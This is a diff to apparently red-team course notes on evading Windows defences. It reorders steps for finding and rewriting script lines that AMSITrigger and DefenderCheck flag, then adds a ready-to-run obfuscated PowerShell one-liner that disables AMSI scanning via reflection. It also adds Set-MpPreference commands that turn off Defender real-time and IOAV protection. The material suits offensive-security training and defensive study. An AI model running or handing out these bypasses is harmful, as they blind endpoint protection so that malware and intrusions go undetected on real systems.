@@ -86,8 +86,25 @@ Type exit from the new PowerShell session to complete the clean-up.
 Steps to avoid signature based detection are pretty simple:
 
 1. Scan using AMSITrigger ([https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)) and DefenderCheck (https://github.com/t3hbb/DefenderCheck):
-   1. Simply provide path to the script file to scan it: `AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1 DefenderCheck.exe PowerUp.ps1`
-   2. For full obfuscation of PowerShell scripts, see Invoke-Obfuscation (https://github.com/danielbohannon/InvokeObfuscation). That is used for obfuscating the AMSI bypass in the course!
-2. Modify the detected code snippet
-3. Rescan using AMSITrigger
-4. Repeat the steps 2 & 3 till we get a result as “AMSI\_RESULT\_NOT\_DETECTED” or “Blank”
+   * Simply provide path to the script file to scan it:
+     * `AmsiTrigger_x64.exe -i InvokePowerShellTcp_Detected.ps1`
+     * `DefenderCheck.exe PowerUp.ps1`
+2. For full obfuscation of PowerShell scripts, see Invoke-Obfuscation (https://github.com/danielbohannon/InvokeObfuscation). That is used for obfuscating the AMSI bypass in the course!
+3. Modify the detected code snippet
+4. Rescan using AMSITrigger
+5. Repeat the steps 2 & 3 till we get a result as “AMSI\_RESULT\_NOT\_DETECTED” or “Blank”
+
+## Bypass AMSI - Windows Defender
+
+Simple way to bypass AMSI:
+
+```powershell
+S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+```
+
+Bypass real time monitoring (requires admin privs):
+
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableIOAVProtection $true
+```
